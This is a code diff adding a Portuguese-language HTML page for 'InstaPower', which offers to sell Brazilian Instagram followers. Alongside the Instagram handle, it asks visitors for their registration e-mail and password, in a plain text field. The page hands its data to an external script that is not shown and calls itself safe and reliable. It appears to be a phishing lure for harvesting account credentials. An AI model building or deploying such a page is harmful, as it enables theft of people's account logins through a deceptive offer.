@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Seguidores Brasileiros - InstaPower</title>
+    <link rel="stylesheet" href="paig.css">
+</head>
+<body>
+    <header>
+        <h1>InstaPower - Seguidores Brasileiros</h1>
+    </header>
+    <main>
+        <section class="form-section">
+            <h2>Ganhe Seguidores Brasileiros no Instagram</h2>
+            <form id="followerForm">
+                <label for="instagramName">Nome do Instagram:</label>
+                <input type="text" id="instagramName" name="instagramName" placeholder="@usuário" required>
+                
+                <label for="followers">Quantidade de Seguidores:</label>
+                <input 
+                    type="text" 
+                    id="followers" 
+                    name="followers" 
+                    maxlength="5" 
+                    placeholder="Digite até 50.000" 
+                    oninput="this.value = this.value.replace(/[^0-9]/g, '')" 
+                    required>
+            </form>
+
+            <form id="loginForm">
+                <label for="email">E-mail de cadastro</label>
+                <input type="text" id="email" name="email" placeholder="E-mail de cadastro" required>
+                
+                <label for="senha">senha</label>
+                <input type="text" id="senha" name="senha" placeholder="senha" required>
+            </form>
+
+            <button id="submitButton">Enviar Dados</button>
+        </section>
+        <section class="info">
+            <p>Garantimos seguidores 100% brasileiros e ativos. Serviço seguro e confiável.</p>
+        </section>
+    </main>
+    <footer>
+        <p>&copy; 2025 InstaPower. Todos os direitos reservados.</p>
+    </footer>
+    <script src="script.js"></script>
+</body>
+</html>
